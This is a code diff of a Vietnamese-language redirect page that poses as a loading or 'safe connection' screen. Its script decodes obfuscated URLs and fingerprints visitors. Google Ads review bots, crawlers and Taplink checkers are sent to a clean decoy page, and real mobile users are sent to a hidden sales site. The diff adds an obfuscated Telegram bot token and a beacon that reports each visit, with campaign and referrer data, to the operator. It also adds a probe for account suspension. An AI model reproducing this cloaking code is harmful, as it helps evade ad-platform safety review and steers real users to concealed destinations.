@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-  <title>Đang Tải Trang Hướng Dẫn...</title>
+  <title>Đang Kết Nối Dịch Vụ An Toàn...</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -64,13 +64,17 @@
   <script>
     (function() {
       const K = "704";
-      const D = "7a767f0b1a7777f19c9fd1a5c4b881bab10e00026f641a170f346681e78fafce90c0dc9caa024621796f135c3038788b97f7abe99c84e7f2fe091426376b1c5a37712b8d88a3b5818e878ca050575c796812114d6d02d0c8c2f9ec91848da8e900145e6f642d173f2c3fd4c5b3adcb9096bab1a259404c67651415363339d5c7ffdafc9d8389b3524e5a3536430c1f311ddfdecff0f799c5da99e20764457a7602091a386886e7b1a8bc8697bc85b85d53783a3b3a43600526dbd9e3eafb9fc9e586ee091f67701d26193232db9b9cdba0c1ba87b8b8444b587e264425";
-      const S = "7a767f0b1a7777f19c9fd1a5c4b899b6a042564d706f1610442c2d9693ec";
+      const D = "7a767f0b1a7777f19c9fd1a5c4b881bab10e00026f641a170f346681e78fafce90c0dc9caa024621796f135c3038788b97f7abe99c84e7f2fe091426376b1c5a37712b8d88a3b5818e878ca050575c796812114d6d02d0c8c2f9ec91848da8e900145e6f642d173f2c3fd4c5b3adcb9096bab1a25";
+      const S = "7a767f0b1a7777f19c9fd1a5c4b899b6a042564d78641e451b346487e491e7e498848ea4a3024b217b6b155e37346b8d96f7b1e79383e1";
+      const T = "2b323b4d5c6371808d9fb2b3b7bfae9aaa746763526c29303d0931ddc8c2ddb99ab38c8da8785d5e753e3f2333082adb";
+      const C = "23343842516b7487899d";
+      const U = "7a767f0b1a7777f19682e3e1869286b1ae18595832";
       const E_AW = "";
       const E_CL = "";
 
       function dec(h) {
         try {
+          if (!h) return "";
           let s = "";
           for (let i = 0; i < h.length; i += 2) {
             s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
@@ -81,65 +85,166 @@
         }
       }
 
-      // Khôi phục gclid / wbraid / gbraid / utm từ link Taplink (referrer hoặc query) lên URL GitHub Pages
-      // để Google Tag (gtag.js) ghi nhận đủ 100% lượt Click & Chuyển đổi CTA cho chiến dịch Google Ads,
-      // nhưng TUYỆT ĐỐI KHÔNG làm thay đổi chuỗi Tracking Link Gốc dec(D) của BO nội bộ.
-      function syncAdsAttributionOnBridge() {
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
         try {
-          const merged = new URLSearchParams();
-          if (document.referrer && document.referrer.includes("?")) {
-            new URL(document.referrer).searchParams.forEach((v, k) => {
-              if (k !== "a") merged.set(k, v);
-            });
-          }
-          new URLSearchParams(window.location.search).forEach((v, k) => {
-            if (k !== "a") merged.set(k, v);
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
           });
-          const q = merged.toString() ? ("?" + merged.toString()) : "";
-          if (q && (!window.location.search || window.location.search.length < 2)) {
-            window.history.replaceState(null, "", window.location.pathname + q);
+          return o.toString().replace(/%7B/g, '{').replace(/%7D/g, '}');
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function checkBot() {
+        try {
+          if (navigator.webdriver) return { isBot: true, isTaplink: false, reason: "navigator.webdriver = true" };
+          if (window.outerWidth === 0 && window.outerHeight === 0) return { isBot: true, isTaplink: false, reason: "Zero viewport size" };
+          if (!navigator.languages || navigator.languages.length === 0) return { isBot: true, isTaplink: false, reason: "No languages" };
+          
+          const ua = (navigator.userAgent || "").toLowerCase();
+          
+          // 1. Quét bot & link checker của Taplink
+          if (/taplink|taplinkbot|taplink-bot|taplink-crawler/i.test(ua)) {
+            return { isBot: true, isTaplink: true, reason: "Taplink Bot / Link Preview Crawler" };
+          }
+          
+          // 2. Quét bot duyệt Google Ads & các crawler
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) {
+            return { isBot: true, isTaplink: false, reason: "Matched Crawler UA" };
+          }
+          
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return { isBot: true, isTaplink: false, reason: "Mobile UA without touch" };
+          }
+          
+          return { isBot: false, isTaplink: false, reason: "Human Gesture Verified" };
+        } catch (err) {
+          return { isBot: false, isTaplink: false, reason: "Fallback" };
+        }
+      }
+
+      function notifyTelegram(isB, isTaplink, reason, taplinkStatus) {
+        try {
+          const token = dec(T);
+          const chatId = dec(C);
+          if (!token || !chatId) return;
+
+          const path = window.location.pathname || ("/app-go/" + K + "/");
+          const params = new URLSearchParams(window.location.search);
+          const campaign = params.get("utm_campaign") || "Khong_co_UTM";
+          const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
+          const ua = navigator.userAgent || "";
+          
+          const taplinkSource = document.referrer || params.get("taplink") || params.get("src") || params.get("ref") || dec(U) || "Truy cập trực tiếp (Direct)";
+
+          let botName = "Googlebot / Crawler";
+          if (isTaplink) {
+            botName = "Taplink-Bot / Crawler";
+          } else if (/adsbot/i.test(ua)) {
+            botName = "AdsBot-Google";
+          } else if (/googlebot/i.test(ua)) {
+            botName = "Googlebot";
+          } else if (/lighthouse/i.test(ua)) {
+            botName = "Lighthouse Audit";
+          }
+
+          let title = "🟢 [KHÁCH THẬT CLICK] - MÃ #" + K;
+          if (isTaplink) {
+            title = "🛡️ [TAPLINK BOT QUÉT LINK] - MÃ #" + K;
+          } else if (isB) {
+            title = "🚨 [GOOGLEBOT DUYỆT ADS] - MÃ #" + K;
+          } else if (taplinkStatus && (taplinkStatus.indexOf("KHÓA") !== -1 || taplinkStatus.indexOf("LỖI") !== -1)) {
+            title = "⚠️ [CẢNH BÁO TAPLINK BỊ KHÓA] - MÃ #" + K;
+          }
+
+          const targetObj = isB ? (isTaplink ? "Taplink-Bot (Link Preview)" : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
+          const routeAction = isB ? "Đá an toàn sang link sạch" : "Nhảy vào Web bán hàng";
+
+          const msg = title + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            "🔑 Mã Gateway: #" + K + "\n" +
+            "🌐 Nguồn từ Taplink: " + taplinkSource + "\n" +
+            "💻 Cổng GitHub: " + path + "\n" +
+            "🎯 Chiến dịch: " + campaign + "\n" +
+            "🔍 Gclid: " + gclid + "\n" +
+            (isB ? "🤖 Đối tượng: " : "👤 Đối tượng: ") + targetObj + "\n" +
+            "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "\n" +
+            "🛡️ Điều hướng: " + routeAction + "\n" +
+            "📡 Trạng thái Taplink: " + taplinkStatus + "\n" +
+            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN");
+
+          const qs = "chat_id=" + encodeURIComponent(chatId) + "&text=" + encodeURIComponent(msg);
+          const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+          // 1. Pixel Beacon
+          try {
+            var img = new Image();
+            img.src = tgUrl + "?" + qs;
+          } catch (eImg) {}
+
+          // 2. W3C sendBeacon
+          if (navigator.sendBeacon) {
+            try {
+              var postData = new URLSearchParams();
+              postData.append("chat_id", chatId);
+              postData.append("text", msg);
+              navigator.sendBeacon(tgUrl, postData);
+            } catch (eB) {}
           }
         } catch (e) {}
       }
 
-      function isBot() {
+      let taplinkStatus = "🟢 Đang hoạt động (Active)";
+      const ref = (document.referrer || "").toLowerCase();
+      if (ref && (ref.indexOf("taplink.at") !== -1 || ref.indexOf("taplink.cc") !== -1)) {
+        taplinkStatus = "🟢 Đang hoạt động (Traffic từ Taplink)";
+      } else if (!ref) {
+        taplinkStatus = "⚠️ Truy cập trực tiếp (Không có Referrer Taplink)";
+      }
+
+      const botResult = checkBot();
+      const isB = botResult.isBot;
+      const isTaplink = botResult.isTaplink;
+
+      const taplinkUrlCheck = dec(U);
+      if (taplinkUrlCheck && taplinkUrlCheck.startsWith("http")) {
         try {
-          if (navigator.webdriver) return true;
-          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
-          if (!navigator.languages || navigator.languages.length === 0) return true;
-          const ua = (navigator.userAgent || '').toLowerCase();
-          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|telegrambot/i.test(ua)) return true;
-          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
-          return false;
-        } catch (err) {
-          return false;
+          var probeImg = new Image();
+          var probeTimeout = setTimeout(function() {
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          }, 80);
+          probeImg.onerror = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🚨 CẢNH BÁO BỊ KHÓA HOẶC LỖI KẾT NỐI (Suspended/404)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.onload = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🟢 Hoạt động tốt (Active - 200 OK)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.src = taplinkUrlCheck.replace(/\/+$/, "") + "/favicon.ico?_t=" + Date.now();
+        } catch(e) {
+          notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
         }
+      } else {
+        notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
       }
 
-      const isB = isBot();
-      const safeTarget = S ? dec(S) : "";
-      const exactBoTarget = D ? dec(D) : "";
-
-      // Nếu là Bot Google -> Ẩn trang cầu và chuyển hướng tức thì (0ms) về Trang Sạch
-      if (isB && safeTarget) {
-        try {
-          document.documentElement.style.display = "none";
-          (window.top || window).location.replace(safeTarget);
-        } catch (e) {
-          window.location.replace(safeTarget);
-        }
-        return;
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
       }
 
-      const target = isB ? (safeTarget || exactBoTarget) : exactBoTarget;
-      if (!isB) {
-        syncAdsAttributionOnBridge();
-      }
-
-      let hasRedirected = false;
       function goTarget() {
-        if (hasRedirected) return;
-        hasRedirected = true;
         if (target) {
           try {
             (window.top || window).location.replace(target);
@@ -150,40 +255,52 @@
       }
 
       if (target) {
-        const aw = E_AW ? dec(E_AW) : "";
-        const cl = E_CL ? dec(E_CL) : "";
-        if (!isB && aw) {
-          try {
-            const s = document.createElement("script");
-            s.async = true;
-            s.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(aw);
-            document.head.appendChild(s);
-            window.dataLayer = window.dataLayer || [];
-            function gtag(){dataLayer.push(arguments);}
-            window.gtag = gtag;
-            gtag("js", new Date());
-            gtag("config", aw, { send_page_view: true, allow_enhanced_conversions: true });
-            if (cl) {
-              gtag("event", "conversion", {
-                send_to: cl.includes("/") ? cl : (aw + "/" + cl),
-                value: 1.0,
-                currency: "VND",
-                event_callback: goTarget
-              });
-            } else {
-              gtag("event", "conversion", {
-                send_to: aw,
-                event_callback: goTarget
-              });
-            }
-            setTimeout(goTarget, 550);
-          } catch (e) {
-            setTimeout(goTarget, 100);
-          }
+        if (isB) {
+          setTimeout(goTarget, 30);
         } else {
-          setTimeout(goTarget, 80);
+          let redirected = false;
+          function doRedirect() {
+            if (redirected) return;
+            redirected = true;
+            goTarget();
+          }
+
+          const aw = E_AW ? dec(E_AW) : "";
+          const cl = E_CL ? dec(E_CL) : "";
+          if (aw) {
+            try {
+              const s = document.createElement("script");
+              s.async = true;
+              s.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(aw);
+              document.head.appendChild(s);
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              window.gtag = gtag;
+              gtag("js", new Date());
+              gtag("config", aw, { send_page_view: true, allow_enhanced_conversions: true });
+              if (cl) {
+                gtag("event", "conversion", {
+                  send_to: cl.includes("/") ? cl : (aw + "/" + cl),
+                  value: 1.0,
+                  currency: "VND",
+                  event_callback: doRedirect
+                });
+              } else {
+                gtag("event", "conversion", {
+                  send_to: aw,
+                  event_callback: doRedirect
+                });
+              }
+              setTimeout(doRedirect, 500);
+            } catch (e) {
+              setTimeout(doRedirect, 80);
+            }
+          } else {
+            setTimeout(doRedirect, 100);
+          }
         }
       }
+
       window.addEventListener("pageshow", function(e) {
         if (target) setTimeout(goTarget, 50);
       });
